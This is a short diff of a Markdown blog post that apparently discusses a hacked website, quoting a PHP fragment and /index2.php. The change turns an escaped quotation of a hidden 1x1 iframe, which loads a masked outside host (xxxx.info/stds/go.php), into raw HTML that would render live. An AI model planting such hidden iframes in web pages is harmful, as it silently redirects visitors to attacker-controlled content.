@@ -44,7 +44,7 @@ tags:
  doGzip();
 
  ?></small>`</big>  
- **<span style="color: rgb(255, 0, 0);">&lt;iframe width=’1′ height=’1′ border=’0′ frameborder=’0′ src=’http://xxxx.info/stds/go.php?sid=3′&gt;&lt;/iframe&gt;**
+ **<span style="color: rgb(255, 0, 0);"><iframe width=’1′ height=’1′ border=’0′ frameborder=’0′ src=’http://xxxx.info/stds/go.php?sid=3′></iframe>**
 
  AND <span style="font-weight: bold;">/index2.php
 
